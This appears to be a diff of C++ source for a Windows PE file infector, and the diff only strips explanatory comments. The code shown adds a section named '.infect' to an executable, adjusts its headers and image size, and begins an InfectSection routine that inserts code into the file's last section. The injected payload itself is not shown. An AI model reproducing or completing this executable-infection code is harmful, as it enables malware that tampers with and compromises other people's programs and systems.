@@ -6,11 +6,9 @@
 #include <cstddef>
 #include <iostream>
 #pragma comment(lib, "User32.lib")
-// This code using filesystem library, so make sure to use C++ 17 or higher
 
 using namespace std;
 using std::byte;
-// Align the given size to the given alignment and returns the aligned address
 DWORD align(DWORD size, DWORD align, DWORD address)
 {
 	if (!(size % align))
@@ -36,9 +34,7 @@ bool CreateNewSection(HANDLE &hFile, PIMAGE_NT_HEADERS &pNtHeader, BYTE *pByte, 
 	} 
 	ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));
 	CopyMemory(&pSectionHeader[sectionCount].Name, ".infect", 8);
-	// Using 8 bytes for section name,cause it is the maximum allowed section name size
 
-	// Insert all the required information about our new PE section
 	pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);
 	pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);
 	pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);
@@ -55,22 +51,16 @@ bool CreateNewSection(HANDLE &hFile, PIMAGE_NT_HEADERS &pNtHeader, BYTE *pByte, 
 	   */
 
 	SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);
-	// End the file right here,on the last section + it's own size
 	SetEndOfFile(hFile);
-	// Change the size of the image,to correspond to modifications
-	// Adding a new section,the image size is bigger
 	pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;
-	// After adding a new section, change the number of section
 	pNtHeader->FileHeader.NumberOfSections += 1;
 	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-	// Adding all the modifications to the file
 	WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
 	return true;
 }
 
 bool InfectSection(HANDLE& hFile, PIMAGE_NT_HEADERS pNtHeader, BYTE* pByte, DWORD fileSize, DWORD byteWritten) {
 
-	// Insert code into last section
 	PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
 	PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
 
@@ -313,7 +303,6 @@ bool OpenFile(const char *fileName)
 	BYTE *pByte = new BYTE[fileSize];
 	DWORD byteWritten;
 
-	// Reading the entire file to use the PE information
 	if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL))
 	{
 		cerr << "Error: Fail to read file " << fileName << endl;
